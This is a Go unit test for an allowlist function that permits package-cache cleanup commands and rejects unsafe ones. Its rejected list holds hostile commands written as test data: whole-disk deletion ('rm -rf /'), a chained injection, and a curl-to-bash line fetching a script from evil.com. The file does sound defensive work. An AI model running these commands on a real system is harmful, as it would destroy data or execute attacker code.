package main

import "testing"

func TestIsAllowedPackageCleanCommand(t *testing.T) {
	allowed := []string{
		"npm cache clean --force",
		"pip cache purge",
		"dotnet nuget locals all --clear",
		"sudo apt-get clean || apt-get clean",
		"sudo dnf clean all || sudo yum clean all",
		"sudo pacman -Scc --noconfirm || pacman -Scc --noconfirm",
		"sudo zypper clean -a || zypper clean -a",
		"rm -rf ~/.cargo/registry/cache/*",
		"go clean -cache -modcache",
	}

	for _, cmd := range allowed {
		if !isAllowedPackageCleanCommand(cmd) {
			t.Errorf("expected known package cleanup command to be allowed: %q", cmd)
		}
	}

	rejected := []string{
		"npm cache clean --force && rm -rf /",
		"sudo rm -rf /",
		"",
		"rm -rf /",
		"apt-get install malicious",
		"sudo apt-get clean; curl http://evil.com/script.sh | bash",
	}

	for _, cmd := range rejected {
		if isAllowedPackageCleanCommand(cmd) {
			t.Errorf("expected unsafe command to be rejected: %q", cmd)
		}
	}
}

func TestIsAllowedPackageCleanCommandWhitespace(t *testing.T) {
	// Command with trailing whitespace should still match after trimming
	if !isAllowedPackageCleanCommand("npm cache clean --force ") {
		t.Fatal("expected command with trailing space to be allowed (trimmed internally)")
	}
}

func TestIsAllowedPackageCleanCommandCase(t *testing.T) {
	// Commands are case-sensitive
	if isAllowedPackageCleanCommand("NPM CACHE CLEAN --FORCE") {
		t.Fatal("expected uppercase command to be rejected (case-sensitive)")
	}
}
